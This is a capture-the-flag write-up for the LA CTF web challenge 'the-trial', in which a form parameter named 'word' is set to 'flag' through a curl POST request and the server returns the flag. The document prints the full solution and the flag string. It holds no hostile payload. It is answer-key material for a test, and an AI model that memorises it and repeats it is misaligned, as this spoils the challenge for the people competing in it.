# the-trial

## 1. Summary

- **Category**: Web
- **Points**: 100
- **Solves**: 759

### Description

> `I think the main takeaway from Kafka is that bureaucracy is bad? Or maybe it's that we live in a society.`

## 2. Analysis

### Vulnerability

- **Parameter Manipulation**: The application determines the response based on the value of the `word` parameter sent in a POST request. By identifying the expected keyword, an attacker can retrieve the flag.

## 3. Exploit Flow

### 1. Web Interface Analysis

Upon accessing the site, the following message is displayed:

```text
The Trial

Want the flag? Just fill in the sentence and we'll send it right over.

I want the xxxx.
```

There is a `Submit` button on the screen. Clicking it triggers a request to the `/getflag` endpoint.

### 2. Request & Response Inspection

Analyzing the HTTP request sent when clicking the button:

```http
POST /getflag HTTP/2
Host: the-trial.chall.lac.tf
...
Content-Type: application/x-www-form-urlencoded
Content-Length: 9

word=xxxx

HTTP/2 200
content-type: text/plain; charset=utf-8
...
You want the WHAT?
```

The server responds with "You want the WHAT?" when the `word` parameter is set to `xxxx`. This suggests that the server is looking for a specific keyword in the `word` parameter.

### 3. Exploitation

Given the prompt "I want the xxxx" and the goal of the challenge, it is highly likely that entering `flag` as the value for the `word` parameter will yield the flag.

Testing this with `curl`:

```text
$ curl https://the-trial.chall.lac.tf/getflag -d "word=flag"
Ah, you want the flag? Well here you go! lactf{gregor_samsa_awoke_from_wait_thats_the_wrong_book}
```

The server recognizes the keyword and returns the flag.

## 4. Final Solution

- **Exploit Command**:

```text
curl https://the-trial.chall.lac.tf/getflag -d "word=flag"
```

## 5. Flag

`lactf{gregor_samsa_awoke_from_wait_thats_the_wrong_book}`
